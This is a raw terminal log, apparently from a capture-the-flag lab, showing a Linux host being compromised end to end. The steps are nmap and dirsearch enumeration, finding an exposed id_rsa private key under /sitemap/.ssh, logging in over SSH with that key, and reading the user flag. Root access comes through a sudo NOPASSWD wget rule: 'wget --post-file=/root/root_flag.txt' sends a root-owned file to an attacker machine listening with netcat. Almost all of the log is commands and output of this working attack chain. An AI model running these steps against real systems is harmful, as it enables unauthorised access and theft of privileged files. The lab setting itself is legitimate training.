sudo nmap -Pn -T4 -sV -sC -A 10.49.168.31 -o nmap
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-17 05:12 -0400
Nmap scan report for 10.49.168.31 (10.49.168.31)
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=7/17%OT=22%CT=1%CU=36439%PV=Y%DS=3%DC=T%G=Y%TM=6A59F22
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=102%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=106%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%
OS:CI=I%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=A)SEQ(SP=107%G
OS:CD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4
OS:E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=68DF%W2=68DF
OS:%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M4E8NNSNW7%C
OS:C=Y%Q=)ECN(R=Y%DF=Y%T=40%W=D2%O=NNT11%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   35.79 ms 192.168.128.1 (192.168.128.1)
2   ...
3   37.27 ms 10.49.168.31 (10.49.168.31)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.14 seconds
                        
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/wgel]
└─$ dirsearch -u 10.49.168.31
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/wgel/reports/_10.49.168.31/_26-07-17_05-18-18.txt

Target: http://10.49.168.31/

[05:18:18] Starting:                                                                                                                                                                                                                        
[05:18:21] 403 -  277B  - /.ht_wsr.txt                                      
[05:18:21] 403 -  277B  - /.htaccess.orig                                   
[05:18:21] 403 -  277B  - /.htaccess.bak1
[05:18:21] 403 -  277B  - /.htaccess.sample                                 
[05:18:21] 403 -  277B  - /.htaccess.save                                   
[05:18:21] 403 -  277B  - /.htaccess_extra                                  
[05:18:21] 403 -  277B  - /.htaccessBAK
[05:18:21] 403 -  277B  - /.htaccess_orig
[05:18:22] 403 -  277B  - /.htaccessOLD2
[05:18:22] 403 -  277B  - /.htaccessOLD                                     
[05:18:22] 403 -  277B  - /.htm
[05:18:22] 403 -  277B  - /.htaccess_sc                                     
[05:18:22] 403 -  277B  - /.html                                            
[05:18:22] 403 -  277B  - /.httr-oauth                                      
[05:18:22] 403 -  277B  - /.htpasswds
[05:18:22] 403 -  277B  - /.htpasswd_test                                   
[05:19:31] 403 -  277B  - /server-status                                    
[05:19:31] 403 -  277B  - /server-status/                                   
[05:19:34] 301 -  314B  - /sitemap  ->  http://10.49.168.31/sitemap/        
                                                                             
Task Completed                             

 dirsearch -u 10.49.168.31/sitemap
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/wgel/reports/_10.49.168.31/_sitemap_26-07-17_05-25-19.txt

Target: http://10.49.168.31/

[05:25:19] Starting: sitemap/                                                                                                                                                                                                               
[05:25:20] 301 -  317B  - /sitemap/js  ->  http://10.49.168.31/sitemap/js/  
[05:25:21] 200 -   14KB - /sitemap/.DS_Store                                
[05:25:22] 403 -  277B  - /sitemap/.ht_wsr.txt                              
[05:25:22] 403 -  277B  - /sitemap/.htaccess.bak1                           
[05:25:22] 403 -  277B  - /sitemap/.htaccess.sample                         
[05:25:22] 403 -  277B  - /sitemap/.htaccess.orig
[05:25:22] 403 -  277B  - /sitemap/.htaccess.save                           
[05:25:22] 403 -  277B  - /sitemap/.htaccess_orig                           
[05:25:22] 403 -  277B  - /sitemap/.htaccess_extra
[05:25:22] 403 -  277B  - /sitemap/.htaccess_sc
[05:25:22] 403 -  277B  - /sitemap/.htaccessBAK
[05:25:22] 403 -  277B  - /sitemap/.htaccessOLD2
[05:25:22] 403 -  277B  - /sitemap/.htaccessOLD
[05:25:22] 403 -  277B  - /sitemap/.html                                    
[05:25:23] 403 -  277B  - /sitemap/.htm                                     
[05:25:23] 403 -  277B  - /sitemap/.htpasswds                               
[05:25:23] 403 -  277B  - /sitemap/.httr-oauth                              
[05:25:23] 403 -  277B  - /sitemap/.htpasswd_test                           
[05:25:25] 200 -    2KB - /sitemap/.sass-cache/                             
[05:25:25] 301 -  319B  - /sitemap/.ssh  ->  http://10.49.168.31/sitemap/.ssh/
[05:25:25] 200 -  462B  - /sitemap/.ssh/                                    
[05:25:25] 200 -    2KB - /sitemap/.ssh/id_rsa                              
[05:25:29] 200 -    3KB - /sitemap/about.html                               
[05:25:50] 200 -    3KB - /sitemap/contact.html                             
[05:25:51] 301 -  318B  - /sitemap/css  ->  http://10.49.168.31/sitemap/css/
[05:25:59] 301 -  320B  - /sitemap/fonts  ->  http://10.49.168.31/sitemap/fonts/
[05:26:03] 301 -  321B  - /sitemap/images  ->  http://10.49.168.31/sitemap/images/
[05:26:03] 200 -    1KB - /sitemap/images/                                  
[05:26:06] 200 -  813B  - /sitemap/js/                                      
                                                                                 
Task Completed                                                                                                                                                                                                                              
                                                                      
┌──(kali㉿kali)-[~/Desktop/wgel]
└─$ chmod 600 id_rsa 
                   

┌──(kali㉿kali)-[~/Desktop/wgel]
└─$ ssh jessie@10.49.168.31 -i id_rsa      
The authenticity of host '10.49.168.31 (10.49.168.31)' can't be established.
ED25519 key fingerprint is: SHA256:6fAPL8SGCIuyS5qsSf25mG+DUJBUYp4syoBloBpgHfc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.168.31' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
jessie@10.49.168.31's password: 

zsh: suspended  ssh jessie@10.49.168.31 -i id_rsa
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/wgel]
└─$ ssh2john id_rsa > rsahash        
id_rsa has no password!
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/wgel]
└─$ ls                       
id_rsa  nmap  reports  rsahash
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/wgel]
└─$ cat rsahash   
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/wgel]
└─$ ssh jessie@10.49.168.31 -i id_rsa 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
jessie@10.49.168.31's password: 

                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/wgel]
└─$ ssh jessie@10.49.168.31 -i id_rsa      
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~/Documents$ cat user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
jessie@CorpOne:~/Documents$
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
jessie@CorpOne:~/Documents$
jessie@CorpOne:~/Documents$ sudo /usr/bin/wget --post-file=/root/root_flag.txt 192.168.132.220:80
--2026-07-17 12:42:25--  http://192.168.132.220/
Connecting to 192.168.132.220:80... connected.
HTTP request sent, awaiting response... No data received.
Retrying.

--2026-07-17 12:42:35--  (try: 2)  http://192.168.132.220/
┌──(kali㉿kali)-[~/Desktop/wgel]
└─$ nc -lvnp 80          
listening on [any] 80 ...
connect to [192.168.132.220] from (UNKNOWN) [10.49.168.31] 48602
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 192.168.132.220
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
                 
